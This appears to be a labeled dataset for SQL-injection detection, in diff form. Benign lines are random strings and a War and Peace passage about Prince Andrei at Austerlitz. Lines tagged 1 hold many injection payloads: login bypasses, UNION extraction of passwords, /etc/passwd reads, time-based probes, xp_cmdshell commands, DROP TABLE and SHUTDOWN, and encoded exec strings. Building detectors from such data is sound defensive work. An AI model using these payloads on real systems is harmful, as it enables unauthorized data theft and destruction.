@@ -1,0 +1,331 @@
+0 &aP7[?`\\A
+0 +1E.Av8n4q
+0 G@k^cBbBeS
+0 .gf10s2=xD
+0 /*5:_hWKAF
+0 wxebY/4xOm
+0 '&nJRH*`cf
+0 #0yW.k5MaQ
+0 ;VuYP_qZQQ
+0 that he intended to lead the column himself. Having ridden to the village
+0 of Pratz, he halted. Prince Andrei, one of the enormous number of persons
+0 constituting the commander in chief's suite, stood behind him. Prince Andrei
+0 felt excited, irritated, and at the same time restrainedly calm, as a man usually
+0 is when a long-desired moment comes. He was firmly convinced that this was the
+0 day of his Toulon or his bridge of Arcole.[1] How it would happen,
+0 he did not know, but he was firmly convinced that it would be so. The
+0 locality and position of our troops were known to him, as far as they could be
+0 known to anyone in our army. His own strategic plan, which there obviously could be no
+0 thought of carrying out now, was forgotten. Now, entering into Weyrother's plan, Prince
+0 Andrei pondered the possible happenstances and came up with new considerations, such as
+0 might call for his swiftness of reflection and decisiveness.
+0 To the left below, in the fog, exchanges of fire between unseen troops could be heard.
+0 There, it seemed to Prince Andrei, the battle would concentrate, there an obstacle would be
+0 encountered, and "it's there that I'll be sent with a brigade or division, and there, with a
+0 standard in my hand, I'll go forward and crush everything ahead of me."
+0 Prince Andrei could not look with indifference at the standards of the battalions
+0 going past him. Looking at a standard, he thought: maybe it is that very standard
+0 with which I'll have to march at the head of the troops.
+0 By morning the night's fog had left only hoarfrost turning into dew on the heights,
+0 but in the hollows the fog still spread its milk-white sea. Nothing could be seen in
+0 that hollow to the left, into which our troops had descended and from which came the
+0 sounds of gunfire. Over the heights was a dark, clear sky, and to the right-the enormous
+0 ball of the sun. Far ahead, on the other shore of the sea of fog, one could make out the
+0 jutting, wooded hills on which the enemy army was supposed to be, and something was discernible.
+0 To the right the guards were entering the region of the fog, with a sound of tramping and wheels
+0 and an occasional gleam of bayonets; to the left, beyond the village, similar masses of cavalry
+0 approached and disappeared into the sea of fog. In front and behind moved the infantry.
+0 The commander in chief stood on the road out of the village, letting the troops pass by him.
+0 Kutuzov seemed exhausted and irritable that morning. The infantry going past him halted without any
+0 command, apparently because something ahead held them up.
+0 But tell them, finally, to form into battalions and go around the village,
+0 Kutuzov said angrily to a general who rode up. "Don't you understand, Your
+0 Excellency, my dear sir, that to stretch out in a defile through village streets
+0 is impossible when we're marching against an enemy?"
+0 I intended to form them up outside the village, Your Excellency, said the general.
+0 Kutuzov laughed biliously.
+0 A fine sight you'd be, lining up in view of the enemy, a very fine sight!
+0 The enemy's still far off, Your Excellency. According to the disposition . . .
+0 The disposition! Kutuzov exclaimed biliously. "Who told you that? . . . Kindly do as you're ordered."
+0 Yes, sir!
+0 Mon cher, Nesvitsky said to Prince Andrei in a whisper, "le vieux est d'une humeur de chien."[2]
+0 An Austrian officer in a white uniform with green plumes on his hat rode up to Kutuzov and asked on
+0 behalf of the emperor whether the fourth column had started into action.
+0 Kutuzov turned away without answering him, and his gaze chanced to rest on Prince Andrei, who was standing
+0 close by. Seeing Bolkonsky, Kutuzov softened the angry and caustic expression of his gaze, as if aware that
+0 his adjutant was not to blame for what was going on. And, without answering the Austrian adjutant, he addressed Bolkonsky:
+0 Allez voir, mon cher, si la troisième division a dépassé le village. Dites-lui de s'arrêter et d'attendre mes ordres.[3]
+0 Prince Andrei had only just started when he stopped him.
+0 Et demandez-lui si les tirailleurs sont postés, he added. "Ce qu'ils font, ce qu'ils font!"[4]
+0 he said to himself, still not answering the Austrian.
+0 Prince Andrei galloped off to carry out his mission.
+0 Overtaking all the advancing battalions, he stopped the third division and ascertained
+0 that there was in fact no line of riflemen in front of our columns. The regimental commander of
+0 the front regiment was very surprised by the order conveyed to him from the commander in chief
+0 to send out riflemen. The regimental commander stood there in the full conviction that there
+0 were more troops ahead of him, and that the enemy was no less than six miles away. In fact,
+0 nothing could be seen ahead but empty terrain sloping away and covered with thick fog.
+0 Having ordered on behalf of the commander in chief that the omission be rectified,
+0 Prince Andrei galloped back. Kutuzov still stood in the same place and, his corpulent
+0 body sagging over the saddle in old man's fashion, yawned deeply, closing his eyes. T
+0 he troops were no longer moving, but stood at parade rest.
+1 SELECT @@version;
+1 SELECT 1; #comment
+1 SELECT /*comment*/1;
+1 SELECT user();
+1 SELECT host, user, password FROM mysql.user;
+1 SELECT database()
+1 SELECT distinct(db) FROM mysql.db
+1 SELECT schema_name FROM information_schema.schemata;
+1 SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
+1 SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
+1 SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table which have a column called ‘username’
+1 SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0;
+1 SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1;
+1 SELECT substr(‘abcd’, 3, 1);
+1 SELECT 6 & 2;
+1 SELECT 6 & 1;
+1 SELECT ascii(‘A’);
+1 SELECT cast(’1? AS unsigned integer);
+1 SELECT cast(’123? AS char);
+1 SELECT CONCAT(‘A’,'B’);
+1 SELECT CONCAT(‘A’,'B’,'C’);
+1 SELECT if(1=1,’foo’,'bar’);
+1 SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END;
+1 SELECT 0×414243;
+1 SELECT BENCHMARK(1000000,MD5(‘A’)); SELECT SLEEP(5);
+1 UNION ALL SELECT LOAD_FILE(‘/etc/passwd’)
+1 SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’;
+1 SELECT @@hostname;
+1 CREATE USER test1 IDENTIFIED BY ‘pass1?;
+1 DROP USER test1;
+1 GRANT ALL PRIVILEGES ON *.* TO test1@’%';
+1 SELECT @@datadir;
+1 admin'--
+1 admin'#
+1 ;DR/**/OP tempTable;
+1  or 1=1--
+1 admin'/*
+1  or 1=1#
+1  or 1=1/*
+1 ) or '1'='1--
+1 ) or ('1'='1--
+1  or ''='
+1 %27%20or%20%27%27%3D%27
+1 admin';DROP myTable--
+1 ;waitfor delay '0:0:10'--
+1 CAST('username' AS SIGNED INTEGER)
+1  ORDER BY 1;--
+1  + (SELECT TOP 1 username FROM users ) + '
+1 ;SHUTDOWN --
+1 %' and '1'='0
+1 %' or 0=0 union select null, user() #
+1 %' or 0=0 union select null, database() #
+1 %' and 1=0 union select null, table_name from information_schema.tables #
+1 %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+1 %' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
+1 $ `or 1=1#
+1 " or ""="
+1  (select top 1
+1  or ''='
+1  or '1'='1'--
+1  or (EXISTS)
+1  or 0=0 --
+1  or 0=0 #
+1  or 1 --'
+1  or 1=1
+1  or 1=1 or ''='
+1  or 3=3
+1  or a=a--
+1  or uid like '%
+1  or uname like '%
+1  or user like '%
+1  or userid like '%
+1  UNION ALL SELECT
+1  UNION SELECT
+1 -- &password=
+1 --sp_password
+1 ,@variable
+1 ; exec ('sel' + 'ect us' + 'er')
+1 ; exec master..xp_cmdshell
+1 ; exec master..xp_cmdshell
+1 ; exec master..xp_cmdshell 'ping 172.10.1.255'--
+1 ; exec master..xp_cmdshell 'ping 172.10.1.255'--
+1 ; exec xp_regread
+1 ; exec xp_regread
+1 ; or '1'='1'
+1 ;waitfor delay '0:0:__TIME__'--
+1 " or "a"="a
+1 " or 0=0 --
+1 " or 1=1--
+1 " or benchmark(10000000,MD5(1))#
+1 " or pg_sleep(__TIME__)--
+1 " or sleep(__TIME__)#
+1 ";waitfor delay '0:0:__TIME__'--
+1 ") or benchmark(10000000,MD5(1))#
+1 ") or pg_sleep(__TIME__)--
+1 ") or sleep(__TIME__)="
+1 ")) or pg_sleep(__TIME__)--
+1 ")) or sleep(__TIME__)="
+1 "));waitfor delay '0:0:__TIME__'--
+1 "a"" or 1=1--"
+1 "a"" or 3=3--"
+1 (select top 1
+1 ) or ('a'='a
+1 ) or ('a'='a
+1 ) or benchmark(10000000,MD5(1))#
+1 ) or pg_sleep(__TIME__)--
+1 ) union select * from information_schema.tables;
+1 )) or benchmark(10000000,MD5(1))#
+1 )) or pg_sleep(__TIME__)--
+1 )) or sleep(__TIME__)='
+1 ));waitfor delay '0:0:__TIME__'--
+1 )%20or%20('x'='x
+1 @var select @var as var into temp end --
+1 @variable
+1 *(|(mail=*))
+1 */*
+1 *|
+1 /**/or/**/1/**/=/**/1
+1 //*
+1 \x27UNION SELECT
+1 &apos;%20OR
+1 %20'sleep%2050'
+1 %20$(sleep%2050)
+1 %20or%20''='
+1 %20or%20''='
+1 %20or%20'x'='x
+1 %20or%20'x'='x
+1 %20or%201=1
+1 %20or%201=1
+1 %20or%20x=x
+1 %27%20or%201=1
+1 %2A%28%7C%28mail%3D%2A%29%29
+1 %2A%28%7C%28objectclass%3D%2A%29%29
+1 %2A%7C
+1 <>"'%;)(&+
+1 ||'6
+1 ||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+1 ||UTL_HTTP.REQUEST
+1 ||UTL_HTTP.REQUEST
+1 0 or 1=1
+1 0x730065006c0065006300740020004000400076006500 ...
+1 0x770061006900740066006F0072002000640065006C00 ...
+1 1 or 1=1
+1 1 or benchmark(10000000,MD5(1))#
+1 1 or pg_sleep(__TIME__)--
+1 1 waitfor delay '0:0:10'--
+1 1;(load_file(char(47,101,116,99,47,112,97,115, ...
+1 1;SELECT%20*
+1 1) or benchmark(10000000,MD5(1))#
+1 1) or pg_sleep(__TIME__)--
+1 1) or sleep(__TIME__)#
+1 1)) or benchmark(10000000,MD5(1))#
+1 1)) or pg_sleep(__TIME__)--
+1 1)) or sleep(__TIME__)#
+1 23 OR 1=1
+1 29 %
+1 â or 1=1 --
+1 â or 3=3 --
+1 a' or 'a' = 'a
+1 a' or 1=1--
+1 a' or 3=3--
+1 a' waitfor delay '0:0:10'--
+1 Ã½ or 1=1 --
+1 admin' or '
+1 and 1 in (select var from temp)--
+1 and 1=( if((load_file(char(110,46,101,120,11 ...
+1 anything' OR 'x'='x
+1 benchmark(10000000,MD5(1))#
+1 char%4039%41%2b%40SELECT
+1 declare @q nvarchar (200) 0x730065006c00650063 ...
+1 declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+1 declare @q nvarchar (200) select @q = 0x770061 ...
+1 declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+1 declare @q nvarchar (4000) select @q =
+1 declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+1 declare @s varchar (8000) select @s = 0x73656c ...
+1 declare @s varchar(200) select @s = 0x77616974 ...
+1 declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
+1 declare @s varchar(22) select @s =
+1 exec sp
+1 exec(@s)
+1 group by userid having 1=1--
+1 having 1=1--
+1 hi or 1=1 --"
+1 hi or a=a
+1 hi' or 'a'='a
+1 hi' or 'x'='x';
+1 hi' or 'x'='x';
+1 hi' or 1=1 --
+1 hi') or ('a'='a
+1 or ''='
+1 or '1'='1'--
+1 or '7659'='7659
+1 or 'a'='a
+1 or 'something' = 'some'+'thing'
+1 or 'text' = n'text'
+1 or 'text' > 't'
+1 or 'unusual' = 'unusual'
+1 or 'whatever' in ('whatever')
+1 or 0=0 --
+1 or 0=0 #
+1 or 0=0 #
+1 or 0=0 #"
+1 or 0=0 #"
+1 or 1 --'
+1 or 1 in (select @@version)--
+1 or 1/*
+1 or 1=1
+1 or 1=1
+1 or 1=1 --
+1 or 1=1 /*
+1 or 1=1 or ''='
+1 or 1=1 or ""=
+1 or 1=1--
+1 or 1=1--
+1 or 2 > 1
+1 or 2 between 1 and 3
+1 or 3=3
+1 or 3=3 --
+1 or a = a
+1 or a = a
+1 or a=a
+1 or a=a
+1 or a=a--
+1 or benchmark(10000000,MD5(1))#
+1 or isNULL(1/0) /*
+1 or pg_sleep(__TIME__)--
+1 or sleep(__TIME__)#
+1 or sleep(__TIME__)='
+1 or username like char(37);
+1 or%201=1
+1 password:*/=1--
+1 pg_sleep(__TIME__)--
+1 PRINT @@variable
+1 select * from information_schema.tables--
+1 select name from syscolumns where id = (sele ...
+1 sqlattempt1
+1 sqlvuln;
+1 t'exec master..xp_cmdshell 'nslookup www.googl ...
+1 t'exec master..xp_cmdshell 'nslookup www.google.com'--
+1 to_timestamp_tz
+1 UNION ALL SELECT
+1 union all select @@version--
+1 union select
+1 UNION                SELECT
+1 union select * from users where login = char ...
+1 union select 1,load_file('/etc/passwd'),1,1,1;
+1 x' AND 1=(SELECT COUNT(*) FROM tabname); --
+1 x' AND email IS NULL; --
+1 x' AND members.email IS NULL; --
+1 x' or 1=1 or 'x'='y
+1 x' OR full_name LIKE '%Bob%
+1 /**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--
+1 %00' UNION SELECT password FROM Users WHERE username='admin'--
+1 or  'a'= 'a'
+1 EXEC('SEL' + 'ECT 1')
+1 value'); DROP TABLE table;--
+1 select count(*) from table_name;
+1 INNER JOIN
+1 WITH Ordered AS (SELECT ROW_NUMBER() OVER (ORDER BY OrderID) AS RowNumber, OrderID, OrderDate FROM Orders) SELECT * FROM Ordered WHERE RowNumber = 1000000
